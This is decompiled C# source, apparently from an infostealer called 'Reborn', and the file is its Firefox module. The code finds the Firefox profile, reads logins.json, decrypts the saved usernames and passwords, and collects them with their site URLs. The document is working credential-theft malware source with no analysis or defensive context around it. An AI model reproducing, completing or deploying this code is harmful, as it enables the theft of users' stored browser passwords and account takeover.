using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using System.Text;

namespace Reborn.Browsers
{
	// Token: 0x02000027 RID: 39
	public class Mozilla
	{
		// Token: 0x060000F6 RID: 246 RVA: 0x00009C8C File Offset: 0x00007E8C
		public static List<PassData> Initialise()
		{
			List<PassData> result;
			try
			{
				Console.WriteLine(Firefox.GetFirefoxInstallPath().FullName);
				FileInfo file = Mozilla.GetFile(Firefox.GetProfilePath(), "logins.json");
				if (file.FullName == "C:\\")
				{
					result = null;
				}
				else
				{
					object arg_58_0 = new Mozilla.JsonData();
					MemoryStream memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(File.ReadAllText(file.FullName)));
					Mozilla.JsonData arg_73_0 = new DataContractJsonSerializer(arg_58_0.GetType()).ReadObject(memoryStream) as Mozilla.JsonData;
					memoryStream.Close();
					IEnumerable<Mozilla.LoginData> arg_97_0 = arg_73_0.logins;
					Func<Mozilla.LoginData, PassData> arg_97_1;
					if ((arg_97_1 = Mozilla.<>c.<>9__0_0) == null)
					{
						arg_97_1 = (Mozilla.<>c.<>9__0_0 = new Func<Mozilla.LoginData, PassData>(Mozilla.<>c.<>9.<Initialise>b__0_0));
					}
					result = arg_97_0.Select(arg_97_1).ToList<PassData>();
				}
			}
			catch (Exception arg)
			{
				Console.WriteLine("Mozilla : " + arg);
				result = null;
			}
			return result;
		}

		// Token: 0x060000F7 RID: 247 RVA: 0x00009D64 File Offset: 0x00007F64
		private static FileInfo GetFile(DirectoryInfo profilePath, string searchTerm)
		{
			FileInfo result;
			try
			{
				FileInfo[] files = profilePath.GetFiles(searchTerm);
				result = ((files.Length == 0) ? new FileInfo("C://") : files[0]);
			}
			catch (Exception arg_22_0)
			{
				Console.WriteLine(arg_22_0.ToString());
				result = null;
			}
			return result;
		}

		// Token: 0x02000028 RID: 40
		[DataContract]
		private class JsonData
		{
			// Token: 0x04000073 RID: 115
			[DataMember]
			public Mozilla.LoginData[] logins;
		}

		// Token: 0x02000029 RID: 41
		[DataContract]
		private class LoginData
		{
			// Token: 0x04000074 RID: 116
			[DataMember]
			public string encryptedPassword;

			// Token: 0x04000075 RID: 117
			[DataMember]
			public string encryptedUsername;

			// Token: 0x04000076 RID: 118
			[DataMember]
			public string formSubmitURL;
		}

		// Token: 0x0200002A RID: 42
		[CompilerGenerated]
		[Serializable]
		private sealed class <>c
		{
			// Token: 0x060000FD RID: 253 RVA: 0x00009DB4 File Offset: 0x00007FB4
			internal PassData <Initialise>b__0_0(Mozilla.LoginData data)
			{
				return new PassData
				{
					Login = Firefox.Decrypt(data.encryptedUsername),
					Password = Firefox.Decrypt(data.encryptedPassword),
					Program = "Mozilla Firefox",
					Url = data.formSubmitURL.Replace("https://", "").Replace("http://", "") + "/"
				};
			}

			// Token: 0x04000077 RID: 119
			public static readonly Mozilla.<>c <>9 = new Mozilla.<>c();

			// Token: 0x04000078 RID: 120
			public static Func<Mozilla.LoginData, PassData> <>9__0_0;
		}
	}
}
